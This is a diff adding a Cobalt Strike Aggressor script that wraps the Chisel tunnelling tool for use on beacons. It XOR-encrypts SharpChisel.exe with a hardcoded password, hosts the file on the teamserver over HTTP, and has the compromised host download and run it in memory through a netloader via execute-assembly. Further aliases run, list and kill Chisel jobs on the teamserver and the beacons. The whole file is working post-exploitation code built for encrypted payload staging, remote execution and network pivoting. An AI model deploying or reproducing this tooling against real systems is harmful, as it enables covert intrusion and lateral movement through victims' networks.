@@ -1,0 +1,395 @@
+# $0 is the alias name and arguments without any parsing
+# $1 is the ID of the Beacon
+# $2 and on contain an individual argument passed to the alias
+
+# Global definitions
+$SHARPCHISELPATH = script_resource('chisel-modules/SharpChisel.exe');
+$SHARPCHISELXORPATH = script_resource('chisel-modules/SharpChisel.xor');
+$SHARPCHISELURI = "/SharpChisel.xor";
+$NETLOADERPATH = script_resource('tools/nls-mod.exe');
+$TMSKILLNIX = script_resource('tools/tmskill.sh');
+$TMSJOBNIX = script_resource('tools/jobs.sh');
+$TMSJOBWIN = script_resource('tools/jobs.bat');
+$TMSKILLWIN = script_resource('tools/tmskill.bat');
+$kill = 0;
+$jobs = 0;
+$getxorpass = "socks5oversocks4";
+                                                                                       
+# Alias definitions
+beacon_command_register("chisel-tms", "Run Chisel on your teamserver", 
+    "\nRun chisel on your windows/linux teamserver\n\n" .
+    "\c7Usage: chisel [command] [--help]\n\n" .
+    "Commands:\n" .
+    "   server - runs chisel in server mode\n" .
+    "   client - runs chisel in client mode\n\n" .
+    "Read more:\n" .
+    "   https://github.com/jpillora/chisel\n");
+
+beacon_command_register("chisel", "Run Chisel on a beacon", 
+    "\nRun chisel on a beacon\n\n" .
+    "\c7Usage: chisel [command] [--help]\n\n" .
+    "Commands:\n" .
+    "   server - runs chisel in server mode\n" .
+    "   client - runs chisel in client mode\n\n" .
+    "Read more:\n" .
+    "   https://github.com/jpillora/chisel\n");
+
+beacon_command_register("chisel-enc", "XOR Encrypt SharpChisel.exe with a password", 
+    "\nXOR Encrypt SharpChisel.exe with a password\n\n" .
+    "\c7Usage: chisel-enc\n");
+
+beacon_command_register("chisel-jobs", "List active chisel jobs on the teamserver and beacon", 
+    "\nList running chisel jobs on the teamserver and beacon\n\n" .
+    "\c7Usage: chisel-jobs\n");
+
+beacon_command_register("chisel-kill", "Kill chisel jobs on beacon", 
+    "\nAutomatically kill all chisel jobs running on beacon\n\n" .
+    "\c7Usage: chisel-kill\n");
+
+beacon_command_register("chisel-tms-kill", "Kill chisel jobs on teamserver", 
+    "\nAutomatically kill all chisel jobs running on teamserver\n\n" .
+    "\c7Usage: chisel-tms-kill\n");
+
+
+alias "chisel" {
+
+    # Banner  
+    $banner = script_resource("tools/banner.txt");
+    $bhandle = openf("$banner");
+    $bannertxt = readAll($bhandle);
+    foreach $value ($bannertxt)
+    {
+        btask($1, "\c7$value");
+    }
+    
+    # Local vars
+    local('$args $binary $location $cmd $netcmd $xorstring $xorurl $computer');
+
+    # Parsing Args
+    $args = substr($0, 7);
+    $base64args = base64_encode("$args");
+    btask($1, "Base64 args are: $base64args");
+
+    # Create XOR String
+    $handle = openf($SHARPCHISELXORPATH);
+    $xorstring = readb($handle, -1);
+    closef($handle);
+
+    # Clean-up already registered hosted file
+    site_kill(80, $SHARPCHISELURI);
+
+    # Host SharpChisel.xor
+    $xorurl = site_host(localip(), 80, $SHARPCHISELURI, $xorstring, "text/plain", "Host SharpChisel.xor", false);
+    btask($1, "Hosted $SHARPCHISELURI @ $xorurl");
+    $base64xorurl = base64_encode("$xorurl");
+    btask($1, "Base64 XOR URL is: $base64xorurl");
+
+    # Execute XOR enc assembly using netloader
+    $base64xorpass = base64_encode("$getxorpass");
+    bexecute_assembly!($1, $NETLOADERPATH, "-b64 -xor $base64xorpass -path $base64xorurl -args $base64args");
+    $computer = beacon_info($1,"computer");
+    elog(mynick() . " executed $xorurl $args at $computer");
+}
+
+
+on beacon_output_jobs {
+    if ($kill == 1)
+    {
+        # Local vars
+        $bd = bdata($1);
+        local('$handle $outpath $jid $pid $task $entry');
+        $computer = beacon_info($1, "computer");
+
+        # Output PID to file
+        $outpath = script_resource("logs/job-pid.log");
+        createNewFile("$outpath");
+        $handle = openf(">$outpath");
+        foreach $entry (split("\n", $2)) {
+            ($jid, $pid, $task) = split("\\s+", $entry);
+            println($handle, "$pid" . "\n");
+        }
+        closef($handle);
+   
+        # Terminate Chisel PID
+        local('$phandle $pidfile $pid')
+        $pidfile = script_resource("logs/job-pid.log");
+        $phandle = openf("$pidfile");
+        $pid = readln($phandle);
+        if ($pid) {
+            bkill!($1, $pid);
+            btask($1, "Terminated \c4chisel job PID $pid");      
+            elog(mynick() . " killed chisel on $computer"); 
+        }
+        else {
+            btask($1, "No chisel jobs found running on " . $computer . " to terminate");
+        }
+
+        # Reset Killswitch
+        $kill = 0;
+    }
+
+    if ($jobs == 1)
+    {
+        # Local vars
+        local('$handle $outpath $jid $pid $task $entry $computer');
+        $bd = bdata($1);
+        $computer = beacon_info($1,"computer");
+
+        # Output PID to file
+        $outpath = script_resource("logs/job-pid.log");
+        createNewFile("$outpath");
+        $handle = openf(">$outpath");
+        foreach $entry (split("\n", $2)) {
+            ($jid, $pid, $task) = split("\\s+", $entry);
+            if ($pid) {
+                println($handle, "$pid");
+            }
+            else {
+                btask($1, "No chisel jobs found running on " . $computer);
+            }
+        }
+        closef($handle);
+   
+        # Display Chisel PID
+        local('$phandle $pidfile $pid')
+        $pidfile = script_resource("logs/job-pid.log");
+        $phandle = openf("$pidfile");
+        @data = readAll($phandle);
+        $pid = @data;
+        $size = size(@data);
+        if ($size != 0) {
+            btask($1, "Chisel job running on " . $computer . " with \c9PID $pid");
+        }
+
+        # Reset Killswitch
+        $jobs = 0;
+    }
+}
+
+
+alias "chisel-kill" {
+
+    # Banner  
+    $banner = script_resource("tools/banner.txt");
+    $bhandle = openf("$banner");
+    $bannertxt = readAll($bhandle);
+    foreach $value ($bannertxt)
+    {
+        btask($1, "\c4$value");
+    }
+
+    # Killswitch to handle job kill event
+    $kill = 1;
+
+    # List Job pid
+    bjobs!($1);
+    
+}
+
+
+alias "chisel-jobs" {
+
+    # Banner  
+    $banner = script_resource("tools/banner.txt");
+    $bhandle = openf("$banner");
+    $bannertxt = readAll($bhandle);
+    foreach $value ($bannertxt)
+    {
+        btask($1, "\c9$value");
+    }
+
+    # List teamserver job pid
+    %props = systemProperties();
+    $os = %props["os.name"];
+    if ("$os" ismatch '[lL]inux*')
+    {
+        $cmd = "/bin/bash $TMSJOBNIX";
+        $process = exec("$cmd");
+        @data = readAll($process);
+        closef($process);
+    }
+    else if ("$os" ismatch '[wW]indows.*')
+    {
+        $cmd = "powershell $TMSJOBWIN";
+        $process = exec("$cmd");
+        @data = readAll($process);
+        closef($process); 
+    }
+    else
+    {
+        btask($1, "OS Check error!");
+    }
+
+    btask($1, "\c3Listing chisel Jobs on $os Teamserver\n");
+    $pid = @data;
+    $size = size(@data);
+    if ($size != 0) {
+        btask($1, "Chisel job running on $os teamserver with \c9PID \c9$pid\n"); 
+    }
+    else {
+        btask($1, "No chisel jobs found running on the $os teamserver\n");
+    } 
+
+    # Killswitch to handle beacon job event
+    $jobs = 1;
+
+    # List beacon Job pid
+    $computer = beacon_info($1,"computer");
+    btask($1, "\c3Listing chisel Jobs on " . $computer . "\n");
+    bjobs!($1);
+   
+}
+
+
+alias "chisel-enc" {
+
+    # Banner  
+    $banner = script_resource("tools/banner.txt");
+    $bhandle = openf("$banner");
+    $bannertxt = readAll($bhandle);
+    foreach $value ($bannertxt)
+    {
+        btask($1, "\c7$value");
+    }
+
+    # Local vars
+    local('$args $xorcmd');
+    $bid = $1;
+
+    # xor encrypt
+    prompt_text("Please enter a password to XOR encrypt SharpChisel.exe", "suckachick", {
+        $getxorpass = $1;
+        btask($bid, "XOR encrpting SharpChisel.exe with password: $getxorpass");
+        $SHARPCHISELPATH = script_resource('chisel-modules/SharpChisel.exe');
+        $SHARPXORPATH = script_resource('tools/SharpXOR.exe');
+        $SHARPXORNIXPATH  = script_resource('tools/SharpXORNIX.exe');
+        $SHARPCHISELXORPATH = script_resource('chisel-modules/SharpChisel.xor');
+        # OS Check & Cmd Exec
+        %props = systemProperties();
+        $os = %props["os.name"];
+        btask($1, "Terminating chisel on $os teamserver");
+        if ("$os" ismatch '[lL]inux*')
+        {
+            $xorcmd = "mono $SHARPXORNIXPATH  $+ $SHARPCHISELPATH  $+ $getxorpass  $+ $SHARPCHISELXORPATH";
+            btask($bid, "Executing on $os Teamserver: $xorcmd");
+            $process = exec("$xorcmd");
+            @data = fork($process);
+            closef($process);
+        }
+        else if ("$os" ismatch '[wW]indows.*')
+        {
+            $xorcmd = "$SHARPXORPATH  $+ $SHARPCHISELPATH  $+ $getxorpass  $+ $SHARPCHISELXORPATH";
+            btask($bid, "Executing on $os Teamserver: $xorcmd");
+            $process = exec("$xorcmd");
+            @data = fork($process);
+            closef($process);
+        }
+        else
+        {
+            btask($1, "$xorcmd could't execute");
+        }    
+        return $getxorpass;
+    });
+}
+
+
+alias "chisel-tms" {
+
+    # Banner  
+    $banner = script_resource("tools/banner.txt");
+    $bhandle = openf("$banner");
+    $bannertxt = readAll($bhandle);
+    foreach $value ($bannertxt)
+    {
+        btask($1, "\cB$value");
+    }
+
+    # Local vars
+    local('$args $props $handle $arch $exe $cmd');
+
+    # Parsing Args
+    $args = substr($0, 11);
+      
+    # Arch Check
+    if (-is64 $1) {
+                $arch   = "x64";
+                $exe    = getFileProper(script_resource("chisel-modules"), "chisel64");
+        }
+        else {
+                $arch   = "x86";
+                $exe    = getFileProper(script_resource("chisel-modules"), "chisel86");
+        }
+   
+    # OS Check & Cmd Exec
+    %props = systemProperties();
+    $os = %props["os.name"];
+    if ("$os" ismatch '[lL]inux*')
+    {
+        $cmd = "$exe  $+ $args";
+        btask($1, "Executing On $os Teamserver: $cmd");
+        $process = exec("$cmd");
+        @data = fork($process);
+        closef($process);
+    }
+    else if ("$os" ismatch '[wW]indows.*')
+    {
+        $cmd = "$exe $+ \.exe  $+ $args";
+        btask($1, "Executing On $os Teamserver: $cmd");
+        $process = exec("$cmd");
+        @data = fork($process);
+        closef($process);
+          
+    }
+    else
+    {
+        btask($1, "OS Check error!");
+    }
+  
+    # Cmd logging
+    elog(mynick() . " executed $cmd on $os teamserver"); 
+    $logpath = script_resource("logs/teamserver.log");
+    createNewFile("$logpath");
+    $handle = openf(">$logpath");
+    println($handle, "$cmd");
+    closef($handle);
+}
+
+alias "chisel-tms-kill" {
+
+
+    # Banner  
+    $banner = script_resource("tools/banner.txt");
+    $bhandle = openf("$banner");
+    $bannertxt = readAll($bhandle);
+    foreach $value ($bannertxt)
+    {
+        btask($1, "\c4$value");
+    }
+
+    # Local vars
+    local('$args $binary $location $cmd $tmskill');
+
+    # OS Check & Cmd Exec
+    %props = systemProperties();
+    $os = %props["os.name"];
+    btask($1, "Terminating \c4all chisel jobs\o on $os teamserver");
+    if ("$os" ismatch '[lL]inux*')
+    {
+        $cmd = "/bin/bash $TMSKILLNIX";
+        $process = exec("$cmd");
+        @data = fork($process);
+        closef($process);
+    }
+    else if ("$os" ismatch '[wW]indows.*')
+    {
+        $cmd = "powershell $TMSKILLWIN";
+        $process = exec("$cmd");
+        @data = fork($process);
+        closef($process); 
+    }
+    else
+    {
+        btask($1, "OS Check error!");
+    }
+    elog(mynick() . " killed all chisel jobs on $os teamserver");
+}
